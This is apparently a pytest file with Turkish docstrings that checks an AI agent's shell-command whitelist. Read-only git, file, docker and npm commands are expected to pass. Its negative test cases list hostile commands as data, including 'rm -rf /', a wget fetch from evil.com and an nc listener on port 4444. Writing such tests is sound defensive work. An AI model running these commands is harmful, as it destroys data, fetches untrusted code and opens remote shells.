"""Whitelist unit testleri - izin verilen komut pattern'leri kontrolu."""

from __future__ import annotations

import pytest

from agent.security.whitelist import DEFAULT_WHITELIST_PATTERNS, Whitelist


class TestWhitelistIsAllowed:
    """Whitelist.is_allowed() testleri."""

    def setup_method(self) -> None:
        """Her test icin yeni Whitelist olustur."""
        self.whitelist = Whitelist()

    # --- Pozitif testler (izin verilen komutlar) ---

    @pytest.mark.parametrize(
        "command",
        [
            "git status",
            "git log --oneline",
            "git diff HEAD~1",
            "git branch -a",
            "git show HEAD",
            "git remote -v",
            "git tag -l",
        ],
    )
    def test_git_read_commands_allowed(self, command: str) -> None:
        """Git okuma komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "ls",
            "ls -la",
            "ls /tmp",
            "cat file.txt",
            "head -n 10 file.txt",
            "tail -f log.txt",
            "grep pattern file.txt",
            "find . -name '*.py'",
            "wc -l file.txt",
        ],
    )
    def test_file_read_commands_allowed(self, command: str) -> None:
        """Dosya okuma komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "docker ps",
            "docker logs container-name",
            "docker stats",
            "docker inspect container-name",
            "docker images",
        ],
    )
    def test_docker_read_commands_allowed(self, command: str) -> None:
        """Docker okuma komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "npm test",
            "npm run lint",
            "npm run build",
            "npm run dev",
            "npm list",
            "npx jest",
        ],
    )
    def test_npm_safe_commands_allowed(self, command: str) -> None:
        """npm guvenli komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "python -m pytest",
            "python -m pylint app/",
            "python -m black --check app/",
            "python -m mypy app/",
        ],
    )
    def test_python_tool_commands_allowed(self, command: str) -> None:
        """Python tool komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "df -h",
            "du -sh /tmp",
            "free -m",
            "top -bn1",
            "ps aux",
            "which python",
            "whoami",
            "uname -a",
            "hostname",
        ],
    )
    def test_system_info_commands_allowed(self, command: str) -> None:
        """Sistem bilgisi komutlari whitelist'te olmali."""
        assert self.whitelist.is_allowed(command) is True

    def test_echo_allowed(self) -> None:
        """echo komutu whitelist'te olmali."""
        assert self.whitelist.is_allowed("echo hello world") is True

    def test_pwd_allowed(self) -> None:
        """pwd komutu whitelist'te olmali."""
        assert self.whitelist.is_allowed("pwd") is True

    # --- Negatif testler (izin verilmeyen komutlar) ---

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "sudo apt install something",
            "wget http://evil.com/script.sh",
            "pip install malware",
            "docker run evil-image",
            "mysql -u root -p",
            "ssh user@host",
            "scp file user@host:/",
            "nc -lvp 4444",
        ],
    )
    def test_dangerous_commands_not_allowed(self, command: str) -> None:
        """Tehlikeli komutlar whitelist'te olmamali."""
        assert self.whitelist.is_allowed(command) is False

    def test_empty_command_not_allowed(self) -> None:
        """Bos komut izin verilmemeli."""
        assert self.whitelist.is_allowed("") is False
        assert self.whitelist.is_allowed("   ") is False

    # --- Ozel pattern testleri ---

    def test_git_push_not_in_whitelist(self) -> None:
        """git push whitelist'te olmamali (approval gerektirir)."""
        assert self.whitelist.is_allowed("git push origin main") is False

    def test_git_commit_not_in_whitelist(self) -> None:
        """git commit whitelist'te olmamali."""
        assert self.whitelist.is_allowed("git commit -m 'test'") is False


class TestWhitelistFindMatchingPattern:
    """Whitelist.find_matching_pattern() testleri."""

    def setup_method(self) -> None:
        """Her test icin yeni Whitelist olustur."""
        self.whitelist = Whitelist()

    def test_find_matching_git_pattern(self) -> None:
        """git status icin eslesen pattern bulunmali."""
        pattern = self.whitelist.find_matching_pattern("git status")
        assert pattern is not None
        assert "git" in pattern

    def test_find_no_match_returns_none(self) -> None:
        """Eslesmeyen komut icin None donmeli."""
        assert self.whitelist.find_matching_pattern("rm -rf /") is None

    def test_empty_command_returns_none(self) -> None:
        """Bos komut icin None donmeli."""
        assert self.whitelist.find_matching_pattern("") is None


class TestWhitelistCustomPatterns:
    """Ozel pattern'ler ile Whitelist testleri."""

    def test_custom_patterns(self) -> None:
        """Ozel pattern'ler ile calisabilmeli."""
        custom = Whitelist(patterns=(r"^my_tool\b",))
        assert custom.is_allowed("my_tool --flag") is True
        assert custom.is_allowed("other_tool") is False

    def test_patterns_property(self) -> None:
        """patterns property dogru donmeli."""
        wl = Whitelist()
        assert wl.patterns == DEFAULT_WHITELIST_PATTERNS

    def test_custom_patterns_property(self) -> None:
        """Custom patterns dogru donmeli."""
        custom_patterns = (r"^test\b",)
        wl = Whitelist(patterns=custom_patterns)
        assert wl.patterns == custom_patterns
